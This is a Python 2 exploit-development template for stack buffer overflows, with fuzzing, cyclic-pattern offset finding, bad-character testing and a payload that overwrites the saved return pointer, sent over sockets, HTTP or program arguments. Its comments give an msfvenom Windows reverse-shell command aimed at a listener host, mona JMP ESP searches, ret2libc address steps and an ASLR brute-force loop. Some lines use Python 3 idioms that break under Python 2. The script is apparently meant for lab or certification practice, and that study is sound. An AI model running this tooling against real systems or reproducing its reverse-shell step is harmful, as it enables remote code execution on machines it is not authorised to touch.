#!/usr/bin/python2
# -*- coding: latin-1 -*-

# This is a Python based template to be used in
# developing stack based buffer-overflow explitation
#
# pip install requests bs4
import socket
import traceback
import struct
import sys
import requests
from bs4 import BeautifulSoup
import os
import binascii

EXPLOIT_TYPE_DETECT_TIMEOUT_MIN_BUFFER_SIZE = 1
EXPLOIT_TYPE_DETECT_TIMEOUT_MAX_BUFFER_SIZE = 1024 * 5

# Deliver channel to use
CHANNEL_TYPE_SOCKET = 1
CHANNEL_TYPE_HTTP = 2
CHANNEL_TYPE_ARG = 3

channel_type = CHANNEL_TYPE_ARG

target_host = "localhost"
target_port = 31337

# Only used with CHANNEL_TYPE_HTTP
url = "http://" + target_host + ":" + str(target_port) + "/example"

# Known bad characters
badchars = [0x00, 0x0A, 0x0D] 

# Only used with CHANNEL_TYPE_SOCKET
socket_timeout = 3.0
socket_recv_buffer = 1024
wait_for_response = True
debug = True

payload_prefix = ""
payload_suffix = "\n"

STATUS_SUCCESS = "success"
STATUS_TIMEOUT = "timeout"
STATUS_ERROR = "error"

#####################
# Utility functions #
#####################

# From: https://github.com/ickerwx/pattern/blob/master/pattern


def pattern_create(length=8192):
    pattern = ''
    parts = ['A', 'a', '0']
    try:
        if not isinstance(length, (int)) and length.startswith('0x'):
            length = int(length, 16)
        elif not isinstance(length, (int)):
            length = int(length, 10)
    except ValueError:
        sys.exit(254)
    while len(pattern) != length:
        pattern += parts[len(pattern) % 3]
        if len(pattern) % 3 == 0:
            parts[2] = chr(ord(parts[2]) + 1)
            if parts[2] > '9':
                parts[2] = '0'
                parts[1] = chr(ord(parts[1]) + 1)
                if parts[1] > 'z':
                    parts[1] = 'a'
                    parts[0] = chr(ord(parts[0]) + 1)
                    if parts[0] > 'Z':
                        parts[0] = 'A'
    return pattern

# From: https://github.com/ickerwx/pattern/blob/master/pattern


def pattern_offset(value, length=8192):
    try:
        if not isinstance(value, (int)) and value.startswith('0x'):
            value = struct.pack('<I', int(value, 16)).strip('\x00')
    except ValueError:
        sys.exit(254)
    pattern = pattern_create(length)
    try:
        return pattern.index(value)
    except ValueError:
        return 'Not found'

#####################
# Channel Functions #
#####################


def send_http(payload):
    resp = requests.post(url, data={"data": payload})
    print("[<] RspCode: " + resp.status_code)
    # soup = BeautifulSoup(resp.text, 'html.parser')


def send_socket(payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_host, target_port))
    s.send(payload)
    if wait_for_response:
        s.settimeout(socket_timeout)
        response = s.recv(socket_recv_buffer)
        print("[<] Rsp: " + str(response))
    s.close()

def send_args(payload):
    print(payload)
    os.system('edb --run /mnt/hgfs/_vm_share/overfw ' + payload)

def build_final_payload(payload):
    if channel_type == CHANNEL_TYPE_SOCKET:
        payload = payload_prefix + payload + payload_suffix
    elif channel_type == CHANNEL_TYPE_HTTP:
        payload = payload
    elif channel_type == CHANNEL_TYPE_ARG:
        payload = payload
    else:
        print("[!] Unknown channel_type")
        exit()
    return payload


def build_filler_payload(splits):
    payload = ""
    charCode = 65
    for split in splits:
        payload = payload + (chr(charCode) * int(split))
        charCode = charCode + 1
    return payload.encode("utf-8")


def send_payload(payload):
    try:
        print("")

        payload = build_final_payload(payload)
        print("[>] Req: " + str(payload))
        if channel_type == CHANNEL_TYPE_SOCKET:
            send_socket(payload)
        elif channel_type == CHANNEL_TYPE_HTTP:
            send_http(payload)
        elif channel_type == CHANNEL_TYPE_ARG:
            send_args(payload)
        else:
            print("[!] Unknown channel_type")
            exit()
        print("[*] Done")
        return STATUS_SUCCESS
    except socket.timeout:
        print("[!] Timeout")
        return STATUS_TIMEOUT
    except Exception as e:
        print("[!] Error ", str(e))
        traceback.print_exc()
        return STATUS_ERROR

#####################
# Exploit Functions #
#####################


def interactive():
    while True:
        print("")
        user_input = raw_input("INPUT ('py:' for python expr, 'exit:' to stop) > ")
        if (user_input.startswith("exit:")):
            break
        if (user_input.startswith("py:")):
            user_input = eval(user_input[3:])
        send_payload(user_input)


def detect_timeout():
    for i in range(EXPLOIT_TYPE_DETECT_TIMEOUT_MIN_BUFFER_SIZE, EXPLOIT_TYPE_DETECT_TIMEOUT_MAX_BUFFER_SIZE):
        value = i * 100
        print("Trying: ", value)
        status = send_payload("A" * value)
        if (status == STATUS_TIMEOUT or status == STATUS_ERROR):
            print("Stopped at: ", value)
            break

def exploit():
    # Compare badcharacter file with ESP:      !mona compare -a esp -f c:\badchar_test.bin
    # Find pattern within registers:           !mona findmsp
    # Payload generation:                      
    #   msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f python –e x 86/shikata_ga_nai -b "\x00\x0a"
    # NASM shell:                              msf-nasm_shell     metasm_shell.rb
    # Look for loaded DLLs:                    !mona modules
    # Find witing a module:                    
    #   JMP ESP:                               !mona find -s "\xff\xe4" -m "wcapwsp.dll"
    #   PUSH ESP, RETN: 
    # Find instruction:                        !mona jmp -r esp -cpb "\x00\x0A\0D"
    # Find offset of instruction:              objdump -D -M intel user32.dll | grep 'jmp.*esp' | head
    #                                          objdump -D validate | grep call| grep eax
    # Instructions:                            Debug - \xCC | Nop - \x90 | SUB ESP \x10 - \x83\xEC\x10
    # Exit functions:                          EXITFUNC=none / EXITFUNC=thread / EXITFUNC=process 
    # Usual bad-characters:                    00 0a
    # Nops or adjustment required due to - GetPC routine


    # ASCII strings (e.g. "ABCD") are stored front-to-back: "\x41\x42\x43\x44\x00"
    # Code (e.g. "NOP # NOP # NOP # RET") is stored front-to-back: "\x90\x90\x90\xC3"
    # Numbers (e.g. 0x1337) are stored back-to-front: "\x37\x13\x00\x00"
    # Memory addresses or "pointers" (e.g. 0xDEADBEEF) are stored back-to front: "\xEF\xBE\xAD\xDE
    #  >>> struct.pack("<I", 0xDEADBEEF)
    #  '\xEF\xBE\xAD\xDE'
    #  >>> struct.pack("<I", 3737844653)
    #  '\xAD\xFB\xCA\xDE'

    # gdb-peda$ pattern_create 500
    # gdb-peda$ pattern_offset AA8A
    # gdb-peda$ run `python -c 'print "A"*112 + "BBBB"'`
    # ldd /usr/local/bin/ovrflw | grep libc
    # readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"
    # strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/" 
    #
    # exit_loc = 0xb75f8000+0x33260
    # system_loc = 0xb75f8000+0x40310
    # bin_sh_loc  = 0xb75f8000+0x162bac
    #
    # When ASLR is enabled:
    # while true; do /usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"'); done

    # cat /proc/sys/kernel/randomize_va_space
    # 0 - no / 1 -  Shared libraries, stack, mmap(), VDSO and heap are randomized. / 2 - full (brk())

    buf_totlen = 1024
    offset_srp = 146

    buf = ""
    buf += "A" * (offset_srp - len(buf))    # padding
    buf += "BBBB"                           # SavedReturnPointer (SRP) overwrite : buf += struct.pack("<I", ptr_jmp_esp)
    buf += "CCCC"                           # ESP should end up pointing here "\xCC\xCC\xCC\xCC" 
    buf += "D" * (buf_totlen - len(buf))    # trailing padding
    buf += "\n"

    send_payload(buf)

def main():
    print_header = True
    while True:
        if print_header:
            print("")
            print("1 - interactive")
            print("2 - detect_timeout")
            print("3 - pattern_create")
            print("4 - pattern_offset")
            print("5 - pattern_send")
            print("6 - send_filler_chars")
            print("7 - find_bad_chars")
            print("9 - exploit")

        option = str(raw_input("Option > "))
        print_header = True
        if (option == "1"):
            interactive()
        elif (option == "2"):
            detect_timeout()
        elif (option.startswith("3")):
            try:
                print(pattern_create(option.split(" ")[1]))
            except IndexError:
                print("Provide length along with the option (Example: '3 1024')")
            print_header = False
        elif (option.startswith("4")):
            try:
                value = option.split(" ")[2]
                if (len(value) > 4):
                    value = bytearray.fromhex(value.strip()).decode()[::-1]
                    print("Finding: " + value)
                offset = pattern_offset(value, option.split(" ")[1])
                print(offset)
            except IndexError:
                print(
                    "Provide length and value to search along with the option (Example: '4 1024 Aa0A')")
            print_header = False
        elif (option.startswith("5")):
            try:
                send_payload(pattern_create(option.split(" ")[1]).encode())
            except IndexError:
                print("Provide length along with the option (Example: '5 1024')")
                print_header = False
        elif (option.startswith("6")):
            payload = build_filler_payload(option.split(" ")[1:])
            send_payload(payload)
        elif (option.startswith("7")):
            section_splits = option.split(" - ")
            filler_splits = section_splits[0].split(" ")[1:]
            badchar_test = ""
            try:
                badchar_splits = []
                if len(section_splits) > 1:
                    badchar_splits = section_splits[1].split(" ")

                altered_badchars = badchars.copy()
                
                for badchar_split in badchar_splits:
                    altered_badchars.append(int(badchar_split, 16))

                # generate the string
                for i in range(0x00, 0xFF+1): # range(0x00, 0xFF) only returns up to 0xFE
                    if i not in altered_badchars: # skip the badchars
                        badchar_test += bytes([i]) # append each non-badchar char to the byte string

                # open a file for writing ("w") the byte string as binary ("b") data
                with open("badchar_test.bin", "wb") as f:
                    f.write(badchar_test)

            except IndexError:
                print("No removals")
            if len(filler_splits) >= 1 and filler_splits[0].startswith("*"):
                filler = "A" * (int(filler_splits[0].split("*")[1]) - len(badchar_test))
                payload = filler + badchar_test
            else:
                payload = build_filler_payload(filler_splits) + badchar_test
            send_payload(payload)
        elif (option.startswith("9")):
            exploit()
        else:
            print("[!] Unknown option")


main()
